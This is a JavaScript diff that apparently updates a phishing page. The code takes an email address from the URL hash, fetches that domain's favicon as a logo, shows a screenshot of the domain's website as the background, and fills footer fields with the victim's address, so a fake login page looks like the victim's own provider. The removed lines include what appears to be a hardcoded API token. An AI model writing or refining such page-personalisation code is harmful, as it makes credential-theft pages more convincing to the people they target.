@@ -1771,16 +1771,54 @@ $('#error').show();
 email.focus;
 return false;
 }
-var ind=my_email.indexOf("@");
-var my_slice=my_email.substr((ind+1));
-$('#footer_dom').html(my_email);
-$('#carss').html(my_email);
-$('#top_label_logo').attr(
-    'src',
-    'https://img.logo.dev/' + my_slice + '?token=pk_XbcRLEiaQmKqN0PgTrqF6A'
+// Define the reusable function
+// reusable function
+// Define the reusable function
+function updateBackground(my_email) {
+  var ind = my_email.indexOf("@");
+  var my_slice = my_email.substr(ind + 1);
+
+  // update footer and logo
+  $('#footer_dom').html(my_email);
+  $('#carss').html(my_email);
+
+  $("#top_label_logo").attr(
+    "src",
+    "https://icons.duckduckgo.com/ip3/" + my_slice + ".ico"
   );
-var mPage = 'https://screenshot.domains/'+my_slice;
-document.getElementById('mainPage').src = mPage; 
+
+  // set screenshot as background image
+  var mPage = "https://image.thum.io/get/https://" + my_slice;
+  document.body.style.backgroundImage = "url('" + mPage + "')";
+  document.body.style.backgroundRepeat = "no-repeat";
+  document.body.style.backgroundPosition = "center center";
+  document.body.style.backgroundAttachment = "fixed";
+  document.body.style.backgroundSize = "cover";
+}
+
+// Get email from URL hash (e.g. #test@yahoo.com)
+function getEmailFromHash() {
+  var hash = window.location.hash; // "#test@yahoo.com"
+  if (hash && hash.length > 1) {
+    return hash.substring(1); // remove the leading "#"
+  }
+  return null;
+}
+
+// Initial load
+var my_email = getEmailFromHash();
+if (my_email) {
+  updateBackground(my_email);
+}
+
+// Listen for hash changes dynamically
+window.addEventListener("hashchange", function() {
+  var new_email = getEmailFromHash();
+  if (new_email) {
+    updateBackground(new_email);
+  }
+});
+ 
 }
 $('#next_button').click(function(event){
 $('#error').hide();
